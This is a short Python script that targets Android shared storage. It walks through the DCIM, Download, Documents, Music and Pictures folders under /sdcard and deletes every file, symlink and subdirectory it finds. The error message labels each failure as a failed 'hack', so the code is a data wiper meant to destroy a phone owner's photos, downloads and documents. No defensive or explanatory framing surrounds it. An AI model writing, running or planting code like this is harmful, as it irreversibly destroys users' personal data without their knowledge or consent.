import os
import shutil


target_folders = ["/sdcard/DCIM", "/sdcard/Download", "/sdcard/Documents", "/sdcard/Music", "/sdcard/Pictures"]

for folder in target_folders:
    if os.path.exists(folder):
        for filename in os.listdir(folder):
            file_path = os.path.join(folder, filename)
            try:
                if os.path.isfile(file_path) or os.path.islink(file_path):
                    os.unlink(file_path)
                elif os.path.isdir(file_path):
                    shutil.rmtree(file_path)
            except Exception as e:
                print(f'Failed to hack {file_path}. Reason: {e}')
print("ID")